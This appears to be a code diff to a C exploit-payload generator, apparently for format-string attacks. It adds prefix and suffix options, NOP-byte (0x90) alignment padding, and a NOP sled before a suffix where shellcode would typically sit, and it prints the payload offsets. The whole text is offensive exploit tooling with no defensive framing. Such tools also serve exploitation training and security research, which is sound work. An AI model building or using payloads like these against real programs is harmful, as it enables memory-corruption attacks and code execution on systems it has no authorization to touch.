@@ -38,6 +38,15 @@ static unsigned int idx_stack_g;
 /* assume that an address is 'address_size_g' bytes long */
 static int address_size_g = 4;
 
+/* prepend the payload with a prefix */
+static char *prefix_g = NULL;
+
+/* append suffix to the payload */
+static char *suffix_g = NULL;
+
+/* how many NOP bytes (0x90) shall we append before suffix */
+static int suffix_nops_g = 0;
+
     __attribute__((noreturn))
 static void usage(const char *arg0)
 {
@@ -64,6 +73,9 @@ static int parse_arguments(int argc, char *argv[])
 	    OPT_WITH,
 	    OPT_STACKIDX,
 	    OPT_ADDR_SIZE,
+	    OPT_PREFIX,
+	    OPT_SUFFIX,
+	    OPT_SFX_NOPS,
 	};
 
 	static struct option long_options[] = {
@@ -71,6 +83,9 @@ static int parse_arguments(int argc, char *argv[])
 	    {"with",     required_argument, 0, OPT_WITH},
 	    {"stackidx", required_argument, 0, OPT_STACKIDX},
 	    {"addrsize", required_argument, 0, OPT_ADDR_SIZE},
+	    {"prefix",   required_argument, 0, OPT_PREFIX},
+	    {"suffix",   required_argument, 0, OPT_SUFFIX},
+	    {"sfxnops",  required_argument, 0, OPT_SFX_NOPS},
 	};
 
 	int option_index;
@@ -100,6 +115,15 @@ static int parse_arguments(int argc, char *argv[])
 		    return -1;
 		}
 
+		break;
+	    case OPT_PREFIX:
+		prefix_g = optarg;
+		break;
+	    case OPT_SUFFIX:
+		suffix_g = optarg;
+		break;
+	    case OPT_SFX_NOPS:
+		suffix_nops_g = atoi(optarg);
 		break;
 	    default:
 		/*
@@ -168,6 +192,24 @@ int main(int argc, char *argv[])
 	usage(argv[0]);
     }
 
+    if (prefix_g != NULL) {
+	int len_pfx = strlen(prefix_g);
+	int mod_len_pfx = len_pfx % address_size_g;
+
+	int len_padding = (mod_len_pfx == 0) ? 0 : address_size_g - mod_len_pfx;
+
+	memcpy(payload + i, prefix_g, len_pfx);
+	i += len_pfx;
+
+	memcpy(payload + i, "\x90\x90\x90\x90\x90\x90\x90", len_padding);
+	i += len_padding;
+
+	/* TODO compute wisely these two values */
+	written += len_pfx + len_padding;
+
+	idx_stack_g += ((len_pfx + len_padding) / address_size_g);
+    }
+
     PUT_ADDR(0);
 
     /* override the address */
@@ -192,6 +234,19 @@ int main(int argc, char *argv[])
 	}
 
 	++idx_stack_g;
+    }
+
+    fprintf(stderr, "NOP bytes are at offset %d (%#x)\n", i, i);
+    for (int nop = 0; nop < suffix_nops_g; ++nop) {
+	payload[i++] = '\x90';
+    }
+
+    if (suffix_g != NULL) {
+	fprintf(stderr, "suffix is at offset %d (%#x)\n", i, i);
+	int len_suffix = strlen(suffix_g);
+
+	memcpy(payload + i, suffix_g, len_suffix);
+	i += len_suffix;
     }
 
     /* we write our payload */
